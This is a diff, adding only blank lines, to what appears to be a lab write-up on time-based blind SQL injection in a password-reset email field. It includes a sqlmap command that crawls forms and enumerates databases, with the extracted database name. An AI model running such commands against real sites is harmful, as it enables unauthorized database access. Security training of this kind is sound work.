@@ -7,9 +7,13 @@ Extract database information through time-based blind SQL injection when no visu
 ## 🔍 Vulnerability Analysis
 
 - **Type**: Time-Based Blind SQL Injection
+
 - **Target**: Password reset functionality
+
 - **Parameter**: Email field in forgot password form
+
 - **Challenge**: Identical responses for all inputs
+
 - **Impact**: Database enumeration through timing side-channels
 
 ## 💥 Exploitation
@@ -22,6 +26,7 @@ Extract database information through time-based blind SQL injection when no visu
 ### Automated Enumeration
 
 ```bash
+
 sqlmap -u "https://target/" --forms --crawl=2 \
   --technique=T --time-sec=5 --batch --dbs
 Result: Extracted database name: utopia
@@ -45,4 +50,5 @@ Tool Configuration: Proper sqlmap flags for time-based injection
 Side-Channel Attacks: Understanding and exploiting timing side-channels
 
 Conducted in controlled environment for educational purposes. All sensitive information (IPs, credentials, session tokens) has been sanitized for security.
+
 ```
